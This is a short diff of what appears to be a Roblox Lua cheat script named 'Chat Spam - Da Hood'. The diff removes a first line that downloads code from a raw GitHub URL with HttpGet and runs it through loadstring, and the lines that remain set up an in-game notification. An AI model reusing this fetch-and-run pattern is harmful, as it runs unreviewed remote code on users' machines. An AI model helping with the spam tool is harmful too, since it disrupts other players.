@@ -1,5 +1,3 @@
-loadstring(game:HttpGet((https://raw.githubusercontent.com/sliwyz/super/main/work), true))()
-
 --// NOTIFICATION \\--
 game.StarterGui:SetCore("SendNotification", {
     Title = "Chat Spam - Da Hood";
